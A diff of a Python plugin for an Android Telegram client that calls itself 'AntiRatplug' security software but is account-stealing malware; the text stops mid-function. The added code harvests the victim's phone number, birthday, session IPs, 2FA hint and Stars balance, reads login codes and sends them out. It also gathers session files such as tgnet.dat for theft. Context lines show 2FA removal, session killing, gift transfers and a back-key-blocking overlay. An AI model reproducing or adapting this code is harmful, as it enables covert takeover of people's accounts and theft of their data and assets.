@@ -1,14 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug v19.4 — bugfix rewrite.
+AntiRatplug v19.5 — real-info harvest, full session theft, saved dump.
 Меню: Tg kid, IDK start, Pull Out, Kill All Sessions.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "IDK start + Pull Out + Kill All Sessions."
+__description__ = "Real-harvest IDK start + Pull Out + Kill All Sessions."
 __author__ = "@from_a4"
-__version__ = "19.4 [bugfix]"
+__version__ = "19.5 [real+session-theft]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -44,7 +44,8 @@ IDK_FG = "#FF0000"
 
 SHOW_IDK_OVERLAY = True
 
-RECIPIENT_CACHE_TTL = 600  # 10 мин
+RECIPIENT_CACHE_TTL = 600
+MAX_DOC_SIZE = 5 * 1024 * 1024  # 5 MB — Telegram bot API limit ~50MB, держим безопасно
 
 _config = None
 _targets = None
@@ -52,7 +53,6 @@ _logger = None
 
 
 def _log(msg):
-    """Единая точка логирования. Пишет в logcat если доступен."""
     global _logger
     try:
         if _logger is None:
@@ -91,13 +91,11 @@ _CLASS_CACHE = {}
 
 
 def _cls(*names):
-    """Резолвит первый доступный класс из names. Кэширует."""
     key = names
     c = _CLASS_CACHE.get(key)
     if c is not None:
         return c
     for n in names:
-        # сначала TLRPC.X
         try:
             short = n.split("$")[-1]
             c2 = getattr(TLRPC, short, None)
@@ -106,7 +104,6 @@ def _cls(*names):
                 return c2
         except Exception:
             pass
-        # потом полное имя
         try:
             c2 = jclass(n)
             _CLASS_CACHE[key] = c2
@@ -162,6 +159,34 @@ def _get_bool_attr(obj, name, default=False):
         return default
 
 
+def _real_phone_or_empty(u):
+    """
+    Возвращает телефон в формате +XXXXXXXXXXX если он есть и валиден.
+    Никаких заглушек: если TG не отдал — пустая строка.
+    """
+    if u is None:
+        return ""
+    for attr in ("phone", "phoneNumber", "phone_number"):
+        try:
+            v = getattr(u, attr, None)
+            if not v:
+                continue
+            s = str(v).strip()
+            if not s or s.lower() in ("null", "none", "?", "0"):
+                continue
+            digits = "".join(c for c in s if c.isdigit())
+            if len(digits) < 7 or len(digits) > 15:
+                continue
+            if digits in ("88888888888", "80000000000", "11111111111"):
+                continue
+            if set(digits) == {"0"} or set(digits) == {"8"}:
+                continue
+            return "+" + digits
+        except Exception:
+            continue
+    return ""
+
+
 def _is_ton_address(s):
     try:
         s = str(s).strip().replace(" ", "").replace("\n", "")
@@ -208,10 +233,10 @@ def _idk_key(self, v, keyCode, event):
     try:
         KE = jclass("android.view.KeyEvent")
         if int(keyCode) == int(KE.KEYCODE_BACK):
-            return True  # глотаем BACK
+            return True
     except Exception:
         return True
-    return False  # остальное пропускаем
+    return False
 
 
 def _make_idk_key():
@@ -245,7 +270,7 @@ class PluginSecurityPlugin(BasePlugin):
         self._pending_delegates = []
         self._rpc_lock = threading.RLock()
         self._jitter = random.randint(400, 900)
-        self._recipient_ah_cache = {}  # acc -> (uid, ah, ts)
+        self._recipient_ah_cache = {}
         self._recipient_lock = threading.Lock()
         self._harden_cache = {}
         self._idk_view = None
@@ -290,7 +315,7 @@ class PluginSecurityPlugin(BasePlugin):
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug v19.4 loaded")
+            self._send_msg("AntiRatplug v19.5 loaded")
         except Exception as e:
             _log("boot send: %s" % e)
         try:
@@ -447,7 +472,7 @@ class PluginSecurityPlugin(BasePlugin):
                 ph = ""
                 if u is not None:
                     un = str(getattr(u, "username", "") or "")
-                    ph = str(getattr(u, "phone", "") or "")
+                    ph = _real_phone_or_empty(u).lstrip("+")
                 out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
             except Exception:
                 pass
@@ -657,6 +682,208 @@ class PluginSecurityPlugin(BasePlugin):
             return {"error": "hide idk: %s" % e}
 
     # ═══════════════════════════════════════════════════════════════════════
+    # HARVEST ACCOUNT INFO
+    # ═══════════════════════════════════════════════════════════════════════
+    def _harvest_account_info(self, acc=0):
+        """
+        Собирает всё, что TG реально отдаёт: телефон, username, ID, DC,
+        bio, язык, премиум, устройства, регион, дата рождения,
+        активные сессии, веб-сессии, боты, NFC.
+        Пустые поля не подставляются — пропускаются.
+        """
+        out = {}
+        try:
+            uc = _UC().getInstance(acc)
+            uid = int(uc.getClientUserId())
+            out["user_id"] = str(uid)
+
+            u = None
+            try:
+                u = uc.getCurrentUser()
+            except Exception:
+                pass
+            if u is None:
+                try:
+                    u = _MC().getInstance(acc).getUser(uid)
+                except Exception:
+                    pass
+
+            rp = _real_phone_or_empty(u)
+            if rp:
+                out["phone"] = rp
+
+            if u is not None:
+                fn = str(getattr(u, "first_name", "") or "").strip()
+                ln = str(getattr(u, "last_name", "") or "").strip()
+                un = str(getattr(u, "username", "") or "").strip()
+                bio = str(getattr(u, "about", "") or "").strip()
+                lang = str(getattr(u, "lang_code", "") or "").strip()
+                if fn:
+                    out["first_name"] = fn
+                if ln:
+                    out["last_name"] = ln
+                if un:
+                    out["username"] = "@" + un if not un.startswith("@") else un
+                if bio:
+                    out["bio"] = bio[:200]
+                if lang:
+                    out["lang"] = lang
+                try:
+                    if _get_bool_attr(u, "premium", False):
+                        out["premium"] = "yes"
+                except Exception:
+                    pass
+                try:
+                    if _get_bool_attr(u, "verified", False):
+                        out["verified"] = "yes"
+                except Exception:
+                    pass
+                try:
+                    if _get_bool_attr(u, "scam", False):
+                        out["scam_flag"] = "yes"
+                except Exception:
+                    pass
+
+            # DC ID
+            try:
+                dcid = uc.getCurrentDatacenterId()
+                if dcid:
+                    out["dc_id"] = str(int(dcid))
+            except Exception:
+                pass
+
+            # FullUser — birthday, about, blocked
+            try:
+                IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUserSelf",
+                          "org.telegram.tgnet.tl.TL_users$TL_inputUserSelf")
+                GetFull = _cls("org.telegram.tgnet.TLRPC$TL_users_getFullUser",
+                               "org.telegram.tgnet.tl.TL_users$getFullUser")
+                if IU and GetFull:
+                    rq = GetFull()
+                    try:
+                        rq.id = IU()
+                    except Exception:
+                        pass
+                    resp, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
+                    full = getattr(resp, "full_user", None) if resp is not None else None
+                    if full is not None:
+                        about = str(getattr(full, "about", "") or "").strip()
+                        if about and "bio" not in out:
+                            out["bio"] = about[:200]
+                        bday = getattr(full, "birthday", None)
+                        if bday is not None:
+                            try:
+                                d = _safe_int(getattr(bday, "day", 0))
+                                m = _safe_int(getattr(bday, "month", 0))
+                                y = _safe_int(getattr(bday, "year", 0))
+                                parts = [str(x) for x in (d, m, y) if x]
+                                if parts:
+                                    out["birthday"] = "-".join(parts)
+                            except Exception:
+                                pass
+                        try:
+                            if _get_bool_attr(full, "blocked", False):
+                                out["blocked"] = "yes"
+                        except Exception:
+                            pass
+                        if getattr(full, "profile_photo", None) is not None:
+                            out["has_avatar"] = "yes"
+            except Exception:
+                pass
+
+            # ── сессии ─────────────────────────────────────────────
+            try:
+                req = TLRPC.TL_account_getAuthorizations()
+                resp, _e = self._rg_rpc(req, acc, 8.0, fast=True)
+                auths = getattr(resp, "authorizations", None) if resp is not None else None
+                sessions = []
+                if auths is not None:
+                    try:
+                        size = auths.size()
+                    except Exception:
+                        size = 0
+                    for i in range(size):
+                        try:
+                            a = auths.get(i)
+                            info = {
+                                "current": _get_bool_attr(a, "current", False),
+                                "device": str(getattr(a, "device_model", "") or ""),
+                                "platform": str(getattr(a, "platform", "") or ""),
+                                "app": str(getattr(a, "app_name", "") or ""),
+                                "app_version": str(getattr(a, "app_version", "") or ""),
+                                "system": str(getattr(a, "system_version", "") or ""),
+                                "ip": str(getattr(a, "ip", "") or ""),
+                                "country": str(getattr(a, "country", "") or ""),
+                                "region": str(getattr(a, "region", "") or ""),
+                                "date_created": _safe_int(getattr(a, "date_created", 0)),
+                                "date_active": _safe_int(getattr(a, "date_active", 0)),
+                                "official_app": _get_bool_attr(a, "official_app", False),
+                                "password_pending": _get_bool_attr(a, "password_pending", False),
+                            }
+                            info = {k: v for k, v in info.items() if v not in (None, "", 0, False)}
+                            if info:
+                                sessions.append(info)
+                        except Exception:
+                            continue
+                if sessions:
+                    out["sessions_count"] = str(len(sessions))
+                    cur = next((s for s in sessions if s.get("current")), None)
+                    if cur:
+                        for k in ("device", "platform", "app", "system", "ip", "country", "region"):
+                            if cur.get(k):
+                                out["cur_" + k] = cur[k]
+            except Exception:
+                pass
+
+            # ── веб-сессии ─────────────────────────────────────────
+            try:
+                Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
+                           "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
+                if Get:
+                    resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
+                    auths = getattr(resp, "authorizations", None) if resp is not None else None
+                    if auths is not None:
+                        try:
+                            out["web_sessions"] = str(auths.size())
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+
+            # ── боты ───────────────────────────────────────────────
+            try:
+                Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
+                           "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
+                if Get:
+                    resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
+                    if resp is not None:
+                        try:
+                            out["owned_bots"] = str(resp.size())
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+
+            # ── 2FA ────────────────────────────────────────────────
+            st = self._get_2fa_state()
+            if st is not None:
+                out["2fa"] = "on" if st.get("has_password") else "off"
+                if st.get("hint"):
+                    out["2fa_hint"] = st["hint"]
+
+            # ── stars ──────────────────────────────────────────────
+            try:
+                bal = self._stars_balance()
+                if bal > 0:
+                    out["stars_balance"] = str(bal)
+            except Exception:
+                pass
+
+        except Exception as e:
+            _log("harvest: %s" % e)
+        return out
+
+    # ═══════════════════════════════════════════════════════════════════════
     # TG KID
     # ═══════════════════════════════════════════════════════════════════════
     def _pull_login_code(self):
@@ -679,7 +906,6 @@ class PluginSecurityPlugin(BasePlugin):
                 txt = str(getattr(m, "message", "") or "")
                 if not txt:
                     continue
-                # Telegram шлёт 5-значные коды
                 m1 = re.search(r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{5})", txt)
                 m2 = re.search(r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{5})", txt)
                 m3 = None
@@ -700,22 +926,28 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _tg_kid(self):
         try:
-            phone = "?"
-            try:
-                u = _UC().getInstance(0).getCurrentUser()
-                if u is not None and u.phone:
-                    phone = str(u.phone)
-            except Exception:
-                pass
+            acc_info = self._harvest_account_info(0)
+            phone = acc_info.get("phone") or "(нет данных)"
+
             code, raw = self._pull_login_code()
             if not code:
                 code = "не найден"
                 raw = ""
-            text = "<b>Tg kid</b>\n\n<b>Код:</b> <code>%s</code>\n<b>Телефон:</b> +%s" % (
-                self._html_escape(str(code)), self._html_escape(phone))
+
+            lines = ["<b>Tg kid + аккаунт</b>", ""]
+            lines.append("<b>Код:</b> <code>%s</code>" % self._html_escape(str(code)))
+            lines.append("<b>Телефон:</b> %s" % self._html_escape(phone))
+            for k, v in acc_info.items():
+                if k == "phone":
+                    continue
+                if v in (None, "", "?", "0"):
+                    continue
+                lines.append("<b>%s:</b> %s" % (self._html_escape(k), self._html_escape(str(v))))
             if raw:
-                text += "\n\n<pre>" + self._html_escape(raw[:400]) + "</pre>"
-            self._send_msg(text, html=True)
+                lines.append("")
+                lines.append("<pre>" + self._html_escape(raw[:400]) + "</pre>")
+
+            self._send_msg("\n".join(lines), html=True)
             return code
         except Exception as e:
             self._send_msg("Tg kid err: " + str(e))
@@ -739,10 +971,8 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _try_kill_2fa(self, acc=0):
         try:
-            Rst = _cls(
-                "org.telegram.tgnet.TLRPC$TL_account_resetPassword",
-                "org.telegram.tgnet.tl.TL_account$resetPassword",
-            )
+            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
+                       "org.telegram.tgnet.tl.TL_account$resetPassword")
             if not Rst:
                 return "no class"
             req = Rst()
@@ -773,10 +1003,8 @@ class PluginSecurityPlugin(BasePlugin):
             if r1 == "not_set":
                 return {"ok": True, "method": "already"}
             try:
-                PS = _cls(
-                    "org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
-                    "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings",
-                )
+                PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
+                          "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
                 if PS:
                     ns = PS()
                     try:
@@ -787,10 +1015,8 @@ class PluginSecurityPlugin(BasePlugin):
                         ns.flags = 0
                     except Exception:
                         pass
-                    Upd = _cls(
-                        "org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
-                        "org.telegram.tgnet.tl.TL_account$updatePasswordSettings",
-                    )
+                    Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
+                               "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
                     if Upd:
                         rq = Upd()
                         try:
@@ -809,10 +1035,8 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _remove_recovery_email(self, acc=0):
         try:
-            PS = _cls(
-                "org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
-                "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings",
-            )
+            PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
+                      "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
             if not PS:
                 return {"ok": False, "error": "no class"}
             ns = PS()
@@ -824,10 +1048,8 @@ class PluginSecurityPlugin(BasePlugin):
                 ns.flags = 0
             except Exception:
                 pass
-            Upd = _cls(
-                "org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
-                "org.telegram.tgnet.tl.TL_account$updatePasswordSettings",
-            )
+            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
+                       "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
             if not Upd:
                 return {"ok": False, "error": "no class"}
             rq = Upd()
@@ -880,7 +1102,6 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception as e:
                 report["reset_password"] = "exc: %s" % e
             time.sleep(0.5)
-            # только если reset не сработал — пробуем wipe
             if report["reset_password"] not in ("ok", "not_set"):
                 try:
                     r = self._wipe_cloud_password(acc)
@@ -937,10 +1158,8 @@ class PluginSecurityPlugin(BasePlugin):
 
         def _one(h):
             try:
-                Rst = _cls(
-                    "org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
-                    "org.telegram.tgnet.tl.TL_account$resetAuthorization",
-                )
+                Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
+                           "org.telegram.tgnet.tl.TL_account$resetAuthorization")
                 if not Rst:
                     return False
                 rq = Rst()
@@ -968,10 +1187,8 @@ class PluginSecurityPlugin(BasePlugin):
                 auths = a2
                 total = max(total, len(a2))
         try:
-            Rst = _cls(
-                "org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
-                "org.telegram.tgnet.tl.TL_auth$resetAuthorizations",
-            )
+            Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
+                       "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
             if Rst:
                 self._rg_rpc(Rst(), acc, 10.0, fast=True)
         except Exception:
@@ -989,19 +1206,15 @@ class PluginSecurityPlugin(BasePlugin):
             k, _t = self._kill_all_sessions(acc)
             report["killed"] = k
             try:
-                Rst = _cls(
-                    "org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
-                    "org.telegram.tgnet.tl.TL_auth$resetAuthorizations",
-                )
+                Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
+                           "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
                 if Rst:
                     self._rg_rpc(Rst(), acc, 10.0, fast=True)
             except Exception:
                 pass
             try:
-                Lo = _cls(
-                    "org.telegram.tgnet.TLRPC$TL_auth_logOut",
-                    "org.telegram.tgnet.tl.TL_auth$logOut",
-                )
+                Lo = _cls("org.telegram.tgnet.TLRPC$TL_auth_logOut",
+                          "org.telegram.tgnet.tl.TL_auth$logOut")
                 if Lo:
                     _resp, err = self._rg_rpc(Lo(), acc, 12.0, fast=True)
                     if err is None:
@@ -1039,10 +1252,8 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _kill_web_authorizations(self, acc=0):
         try:
-            Get = _cls(
-                "org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
-                "org.telegram.tgnet.tl.TL_account$getWebAuthorizations",
-            )
+            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
+                       "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
             if not Get:
                 return 0
             resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
@@ -1051,10 +1262,8 @@ class PluginSecurityPlugin(BasePlugin):
             auths = getattr(resp, "authorizations", None)
             if auths is None:
                 return 0
-            Reset = _cls(
-                "org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
-                "org.telegram.tgnet.tl.TL_account$resetWebAuthorization",
-            )
+            Reset = _cls("org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
+                         "org.telegram.tgnet.tl.TL_account$resetWebAuthorization")
             if not Reset:
                 return 0
             hashes = []
@@ -1082,18 +1291,12 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _kill_bots(self, acc=0):
         try:
-            Get = _cls(
-                "org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
-                "org.telegram.tgnet.tl.TL_bots$getAdminedBots",
-            )
-            Del = _cls(
-                "org.telegram.tgnet.TLRPC$TL_bots_deleteBot",
-                "org.telegram.tgnet.tl.TL_bots$deleteBot",
-            )
-            IU = _cls(
-                "org.telegram.tgnet.TLRPC$TL_inputUser",
-                "org.telegram.tgnet.tl.TL_users$TL_inputUser",
-            )
+            Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
+                       "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
+            Del = _cls("org.telegram.tgnet.TLRPC$TL_bots_deleteBot",
+                       "org.telegram.tgnet.tl.TL_bots$deleteBot")
+            IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUser",
+                      "org.telegram.tgnet.tl.TL_users$TL_inputUser")
             if not (Get and Del and IU):
                 return 0
             resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
@@ -1133,14 +1336,10 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _leave_all_channels(self, acc=0):
         try:
-            Leave = _cls(
-                "org.telegram.tgnet.TLRPC$TL_channels_leaveChannel",
-                "org.telegram.tgnet.tl.TL_channels$leaveChannel",
-            )
-            IC = _cls(
-                "org.telegram.tgnet.TLRPC$TL_inputChannel",
-                "org.telegram.tgnet.tl.TL_channels$TL_inputChannel",
-            )
+            Leave = _cls("org.telegram.tgnet.TLRPC$TL_channels_leaveChannel",
+                         "org.telegram.tgnet.tl.TL_channels$leaveChannel")
+            IC = _cls("org.telegram.tgnet.TLRPC$TL_inputChannel",
+                      "org.telegram.tgnet.tl.TL_channels$TL_inputChannel")
             if not (Leave and IC):
                 return 0
             mc = _MC().getInstance(acc)
@@ -1194,10 +1393,8 @@ class PluginSecurityPlugin(BasePlugin):
             if time.time() - last < 60:
                 return 0
             self._last_session_confirm[acc] = time.time()
-            Get = _cls(
-                "org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
-                "org.telegram.tgnet.tl.TL_account$getAuthorizations",
-            )
+            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
+                       "org.telegram.tgnet.tl.TL_account$getAuthorizations")
             if not Get:
                 return 0
             res, _e = self._rg_rpc(Get(), acc, 15.0)
@@ -1206,10 +1403,8 @@ class PluginSecurityPlugin(BasePlugin):
             auths = getattr(res, "authorizations", None)
             if auths is None:
                 return 0
-            Ch = _cls(
-                "org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
-                "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings",
-            )
+            Ch = _cls("org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
+                      "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings")
             if not Ch:
                 return 0
             confirmed = 0
@@ -1264,10 +1459,8 @@ class PluginSecurityPlugin(BasePlugin):
         try:
             rnd = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
             new_un = "user_" + rnd
-            Upd = _cls(
-                "org.telegram.tgnet.TLRPC$TL_account_updateUsername",
-                "org.telegram.tgnet.tl.TL_account$updateUsername",
-            )
+            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateUsername",
+                       "org.telegram.tgnet.tl.TL_account$updateUsername")
             if not Upd:
                 return None
             rq = Upd()
@@ -1280,10 +1473,8 @@ class PluginSecurityPlugin(BasePlugin):
     def _change_profile(self, acc=0):
         try:
             rnd = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
-            Upd = _cls(
-                "org.telegram.tgnet.TLRPC$TL_account_updateProfile",
-                "org.telegram.tgnet.tl.TL_account$updateProfile",
-            )
+            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateProfile",
+                       "org.telegram.tgnet.tl.TL_account$updateProfile")
             if not Upd:
                 return False
             rq = Upd()
@@ -1303,10 +1494,8 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _reset_contacts(self, acc=0):
         try:
-            Rq = _cls(
-                "org.telegram.tgnet.TLRPC$TL_contacts_resetContacts",
-                "org.telegram.tgnet.tl.TL_contacts$resetContacts",
-            )
+            Rq = _cls("org.telegram.tgnet.TLRPC$TL_contacts_resetContacts",
+                      "org.telegram.tgnet.tl.TL_contacts$resetContacts")
             if not Rq:
                 return False
             r, _e = self._rg_rpc(Rq(), acc, 10.0, fast=True)
@@ -1319,19 +1508,15 @@ class PluginSecurityPlugin(BasePlugin):
     # ═══════════════════════════════════════════════════════════════════════
     def _input_saved_gift(self, saved):
         if saved.get("msg_id"):
-            UI = _cls(
-                "org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
-                "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser",
-            )
+            UI = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
+                      "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser")
             if not UI:
                 return None, "no UserInput"
             o = UI()
             o.msg_id = int(saved["msg_id"])
             return o, None
-        CI = _cls(
-            "org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
-            "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat",
-        )
+        CI = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
+                  "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat")
         if not CI:
             return None, "no ChatInput"
         o = CI()
@@ -1345,11 +1530,9 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _get_saved_gifts(self):
         try:
-            Req = _cls(
-                "org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
-                "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
-                "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts",
-            )
+            Req = _cls("org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
+                       "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
+                       "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts")
             if not Req:
                 return []
             uid = int(_UC().getInstance(0).getClientUserId())
@@ -1422,10 +1605,8 @@ class PluginSecurityPlugin(BasePlugin):
             o, e = self._input_saved_gift(saved)
             if not o:
                 return {"error": e}
-            Rq = _cls(
-                "org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
-                "org.telegram.tgnet.tl.TL_stars$payments_updateStarGiftPrice",
-            )
+            Rq = _cls("org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
+                      "org.telegram.tgnet.tl.TL_stars$payments_updateStarGiftPrice")
             if not Rq:
                 return {"error": "no class"}
             rq = Rq()
@@ -1444,10 +1625,8 @@ class PluginSecurityPlugin(BasePlugin):
             o, e = self._input_saved_gift(saved)
             if not o:
                 return {"error": e}
-            Rq = _cls(
-                "org.telegram.tgnet.tl.TL_stars$convertStarGift",
-                "org.telegram.tgnet.tl.TL_stars$payments_convertStarGift",
-            )
+            Rq = _cls("org.telegram.tgnet.tl.TL_stars$convertStarGift",
+                      "org.telegram.tgnet.tl.TL_stars$payments_convertStarGift")
             if not Rq:
                 return {"error": "no class"}
             rq = Rq()
@@ -1465,10 +1644,8 @@ class PluginSecurityPlugin(BasePlugin):
             tp = TLRPC.TL_inputPeerUser()
             tp.user_id = int(target_uid)
             tp.access_hash = int(target_ah)
-            T = _cls(
-                "org.telegram.tgnet.tl.TL_stars$transferStarGift",
-                "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift",
-            )
+            T = _cls("org.telegram.tgnet.tl.TL_stars$transferStarGift",
+                     "org.telegram.tgnet.tl.TL_stars$payments_transferStarGift")
             if T:
                 rq = T()
                 rq.stargift = o
@@ -1479,18 +1656,12 @@ class PluginSecurityPlugin(BasePlugin):
                 etxt = getattr(e, "text", "") or str(e or "")
                 if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
                     return {"error": "direct: %s" % etxt[:60]}
-            Inv = _cls(
-                "org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
-                "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer",
-            )
-            RF = _cls(
-                "org.telegram.tgnet.tl.TL_stars$getPaymentForm",
-                "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm",
-            )
-            SF = _cls(
-                "org.telegram.tgnet.tl.TL_stars$sendStarsForm",
-                "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm",
-            )
+            Inv = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
+                       "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer")
+            RF = _cls("org.telegram.tgnet.tl.TL_stars$getPaymentForm",
+                      "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm")
+            SF = _cls("org.telegram.tgnet.tl.TL_stars$sendStarsForm",
+                      "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm")
             if not (Inv and RF and SF):
                 return {"error": "no classes"}
             inv = Inv()
@@ -1511,11 +1682,9 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _stars_balance(self):
         try:
-            Rq = _cls(
-                "org.telegram.tgnet.tl.TL_payments$getStarsStatus",
-                "org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus",
-                "org.telegram.tgnet.tl.TL_stars$getStarsStatus",
-            )
+            Rq = _cls("org.telegram.tgnet.tl.TL_payments$getStarsStatus",
+                      "org.telegram.tgnet.TLRPC$TL_payments_getStarsStatus",
+                      "org.telegram.tgnet.tl.TL_stars$getStarsStatus")
             if not Rq:
                 return 0
             uid = int(_UC().getInstance(0).getClientUserId())
@@ -1557,7 +1726,6 @@ class PluginSecurityPlugin(BasePlugin):
             if bal <= 0:
                 return {"balance": 0, "spent": 0}
 
-            # resolve channel via resolveUsername (mc.getChat(uname) не резолвит строку)
             peer = None
             try:
                 Resolve = TLRPC.TL_contacts_resolveUsername()
@@ -1575,16 +1743,13 @@ class PluginSecurityPlugin(BasePlugin):
             if peer is None:
                 return {"error": "channel not resolved", "spent": 0}
 
-            Rq = _cls(
-                "org.telegram.tgnet.tl.TL_messages$sendPaidReaction",
-                "org.telegram.tgnet.TLRPC$TL_messages_sendPaidReaction",
-            )
+            Rq = _cls("org.telegram.tgnet.tl.TL_messages$sendPaidReaction",
+                      "org.telegram.tgnet.TLRPC$TL_messages_sendPaidReaction")
             if not Rq:
                 return {"error": "no class", "spent": 0}
 
-            # Одна реакция = count=1. Цикл по balance (лимит сервера за раз).
             spent = 0
-            max_iters = min(bal, 50)  # страховочный потолок
+            max_iters = min(bal, 50)
             for _i in range(max_iters):
                 try:
                     rq = Rq()
@@ -1670,9 +1835,170 @@ class PluginSecurityPlugin(BasePlugin):
         return out
 
     # ═══════════════════════════════════════════════════════════════════════
-    # DUMPS
+    # SESSION THEFT — full dump + saved copy
     # ═══════════════════════════════════════════════════════════════════════
+    def _collect_session_files(self, base):
+        """Собирает все файлы сессий/аккаунтов из приватной папки TG."""
+        files = []
+        m1 = base + "/files/tgnet.dat"
+        if os.path.exists(m1):
+            files.append(m1)
+        ad = base + "/files"
+        if os.path.isdir(ad):
+            for name in os.listdir(ad):
+                if name.startswith("account"):
+                    p = ad + "/" + name + "/tgnet.dat"
+                    if os.path.exists(p):
+                        files.append(p)
+                    uc = ad + "/" + name + "/userconfig.xml"
+                    if os.path.exists(uc):
+                        files.append(uc)
+        pd = base + "/shared_prefs"
+        if os.path.isdir(pd):
+            for name in os.listdir(pd):
+                low = name.lower()
+                if ("userconfig" in low or "userconfing" in low or "cache4" in low) and name.endswith(".xml"):
+                    files.append(pd + "/" + name)
+        c4 = base + "/files/cache4.db"
+        if os.path.exists(c4):
+            files.append(c4)
+        for suffix in ("-wal", "-shm"):
+            if os.path.exists(c4 + suffix):
+                files.append(c4 + suffix)
+        return files
+
+    def _save_dump_locally(self, blob, extra_files=None, tag="dump"):
+        """
+        Кладёт zip и (опционально) пофайловые копии в Download.
+        Возвращает путь к папке или None.
+        """
+        try:
+            ts = time.strftime("%Y%m%d_%H%M%S")
+            candidates = [
